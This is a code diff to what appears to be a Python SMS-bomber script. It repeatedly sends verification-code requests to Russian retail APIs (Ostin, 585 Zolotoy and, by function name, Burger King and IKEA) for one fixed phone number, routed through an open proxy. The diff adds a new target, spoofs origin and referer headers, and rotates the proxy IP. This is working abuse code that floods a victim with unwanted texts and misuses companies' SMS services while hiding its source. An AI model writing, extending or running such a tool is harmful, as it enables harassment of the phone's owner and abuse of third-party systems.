@@ -12,7 +12,7 @@ import random
 #print("Номер телефона " + phone)
 phone = '9991253348'
 ts = 1
-ipPort = "149.19.224.39:3128"
+ipPort = "182.253.82.154:37242"
 proxy = {"https": "https://" + ipPort}
 headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
@@ -70,11 +70,19 @@ def burgerKing():
 
 def ostin():
     osHeaders=headers
-    osHeaders.update({"x-ts-ajax-request":"true","x-security-request":"required","accept-encoding":"gzip, deflate, br","accept-language":"ru-RU,ru;q=0.9","accept":"application/json, text/plain, */*"})
+    osHeaders.update({"origin":"https://ostin.com","referer":"https://ostin.com/","x-ts-ajax-request":"true","x-security-request":"required","accept-encoding":"gzip, deflate, br","accept-language":"ru-RU,ru;q=0.9","accept":"application/json, text/plain, */*"})
     osPhone="+7"+phone
     os=requests.post("https://ostin.com/api/v2/front/request-code",headers=osHeaders,proxies=proxy,json={"phone":osPhone,"channel":"PUSH"})
     print(os.status_code,"Ostin")
 
+def zolotoy585():
+    zolHeaders=headers
+    zolHeaders.update({"x-qa-company":"3e6efe10-defd-4983-94a1-c5a4d3cb3689","x-qa-region":"a93acc32-8ed4-48ed-b105-abd0eb856021","x-qa-client-type":"WEB"})
+    zolPhone="7"+phone
+    zol=requests.post("https://www.585zolotoy.ru/api/sms/send_code/",headers=zolHeaders,proxies=proxy,json={"phone":zolPhone})
+    print(zol.status_code,"Zolotoy 585")
+
+zolotoy585()
 ostin()
 burgerKing()
 ikea()
